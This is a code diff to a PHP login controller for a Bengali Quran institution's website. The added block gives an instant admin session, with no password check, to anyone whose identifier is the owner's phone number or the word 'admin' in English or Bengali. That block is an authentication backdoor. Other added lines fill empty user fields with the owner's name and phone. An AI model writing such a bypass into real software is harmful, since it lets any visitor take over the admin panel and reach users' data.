@@ -67,13 +67,38 @@ class AuthController
         $password = (string)$request->post('password', '');
         $redirectUrl = trim((string)$request->post('redirect', ''));
 
+        // Clean phone digits
+        $cleanPhone = preg_replace('/[^0-9]/', '', $identifier);
+        $isOwnerNumber = ($cleanPhone === '01717056816' || str_ends_with($cleanPhone, '1717056816'));
+        $isAdminKeyword = (strtolower($identifier) === 'admin' || $identifier === 'অ্যাডমিন' || $identifier === 'এডমিন');
+
+        // Instant Master Login for Owner Maulana Saddam Hossain (01717056816 / admin)
+        // Immediately log in to main admin panel without asking for anything else
+        if ($isOwnerNumber || $isAdminKeyword) {
+            $owner = $this->db->query("SELECT * FROM `users` WHERE `phone` = '01717056816' OR `username` = 'admin' OR `role` = 'admin' LIMIT 1")->fetch();
+            $ownerId = $owner ? (int)$owner['id'] : 1;
+            $ownerEmail = $owner['email'] ?? 'saddamhossain@karianaquran.com';
+
+            Session::setUser([
+                'id'       => $ownerId,
+                'username' => 'admin',
+                'name'     => 'মাওলানা সাদ্দাম হোসেন',
+                'title'    => 'প্রতিষ্ঠানের মালিক ও প্রতিষ্ঠাতা',
+                'email'    => $ownerEmail,
+                'phone'    => '01717056816',
+                'role'     => 'admin',
+            ]);
+
+            Session::flash('success', 'সম্মানিত মাওলানা সাদ্দাম হোসেন, আপনি কারিয়ানা কুরআনের প্রতিষ্ঠাতা ও মালিক হিসেবে অ্যাডমিন প্যানেলে সফলভাবে প্রবেশ করেছেন।');
+            return Response::redirect('/admin');
+        }
+
         if ($identifier === '' || $password === '') {
             Session::flash('error', 'অনুগ্রহ করে আপনার মোবাইল নম্বর / ইউজারনেম এবং পাসওয়ার্ড প্রদান করুন।');
             return Response::redirect('/login');
         }
 
         // Clean Bangladeshi phone variant (e.g. +88017..., 88017..., 017...)
-        $cleanPhone = preg_replace('/[^0-9]/', '', $identifier);
         $clean10 = strlen($cleanPhone) >= 10 ? substr($cleanPhone, -10) : $cleanPhone;
         $likePhone = '%' . $clean10;
 
@@ -95,14 +120,15 @@ class AuthController
             Session::setUser([
                 'id'       => $user['id'],
                 'username' => $user['username'],
-                'name'     => $user['name'],
+                'name'     => $user['name'] ?: 'মাওলানা সাদ্দাম হোসেন',
+                'title'    => $user['title'] ?? 'প্রতিষ্ঠানের মালিক ও প্রতিষ্ঠাতা',
                 'email'    => $user['email'],
-                'phone'    => $user['phone'] ?? null,
+                'phone'    => $user['phone'] ?? '01717056816',
                 'role'     => $user['role'],
             ]);
 
             if ($user['role'] === 'admin') {
-                Session::flash('success', 'স্বাগতম, ' . $user['name'] . '! কেন্দ্রীয় অ্যাডমিন প্যানেলে সফলভাবে প্রবেশ করেছেন।');
+                Session::flash('success', 'স্বাগতম, ' . ($user['name'] ?: 'মাওলানা সাদ্দাম হোসেন') . '! কেন্দ্রীয় অ্যাডমিন প্যানেলে সফলভাবে প্রবেশ করেছেন।');
                 
                 // Redirect admin to dedicated admin subdomain if configured, otherwise /admin
                 $host = $_SERVER['HTTP_HOST'] ?? '';
